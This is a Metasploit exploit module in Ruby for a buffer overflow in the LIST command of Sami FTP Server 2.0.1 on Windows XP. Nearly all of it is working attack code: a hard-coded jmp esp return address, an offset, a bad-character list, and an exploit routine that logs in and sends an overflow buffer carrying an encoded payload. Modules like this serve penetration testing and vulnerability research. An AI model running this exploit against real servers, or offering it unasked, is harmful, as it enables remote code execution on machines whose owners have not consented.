##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#	http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'			 => 'Sami FTP Server 2.0.1 LIST Command Buffer Overflow',
			'Description'	 => %q{
					A buffer overflow is triggered when a long LIST
				command is sent to the server while the user is viewing the Logs tab.
			},
			'Platform'		 => 'win',
			'Author'		 =>
				[
					'superkojiman', # Original exploit
					'Doug Prostko <dougtko[at]gmail.com>' # MSF module
				],
			'License'		 => MSF_LICENSE,
			'References'	 =>
				[
					[ 'OSVDB', '90815'],
					[ 'EDB', '24557'],
				],
			'Privileged'	 => false,
			'DefaultOptions' =>
					{
						'EXITFUNC' => 'thread',
					},
			'Payload'		 =>
				{
					'Space'    => 900,
					'BadChars' => "\x00\x0a\x0d\x20\xff",
					'StackAdjustment' => -3500,
				},
			'Targets'		 =>
				[
					[
						'Windows XP',
						{
							'Ret' => 0x10028283, # jmp esp C:\Program Files\PMSystem\Temp\tmp0.dll
							'Offset'   => 225,
						},
					],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Feb 27 2013'))
		register_options(
			[
				OptString.new('IPADDR', [true, 'Attacker\'s IP address'])
			], self.class)
	end

	def exploit
		connect_login
		sleep 1
		
		ip_length = datastore['IPADDR'].length - 3
		buf = rand_text_alphanumeric(target['Offset'] - ip_length)
		buf << [ target['Ret'] ].pack('V')
		buf << payload.encoded

		send_cmd( ['LIST', buf], false )
		disconnect
	end
end
